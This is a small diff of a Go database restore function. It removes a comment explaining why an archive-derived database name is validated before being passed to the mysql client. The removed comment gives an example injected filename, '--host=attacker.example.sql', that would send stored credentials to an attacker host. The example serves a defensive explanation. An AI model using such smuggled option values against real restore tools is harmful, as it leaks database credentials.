@@ -101,11 +101,6 @@ func (e *Exporter) restoreSQL(ctx context.Context, record *connectors.Record) er
 		targetDB = strings.TrimSuffix(base, ".sql")
 	}
 
-	// The filename comes from the archive and targetDB is appended as the
-	// trailing argv element.  The mysql client parses options anywhere in
-	// argv, so a record named "--host=attacker.example.sql" would override
-	// the -h that precedes it and authenticate against that host with the
-	// credentials from --defaults-extra-file.
 	if targetDB != "" {
 		if err := mysqlconn.ValidDatabaseName(targetDB); err != nil {
 			return fmt.Errorf("validating db name: %w", err)
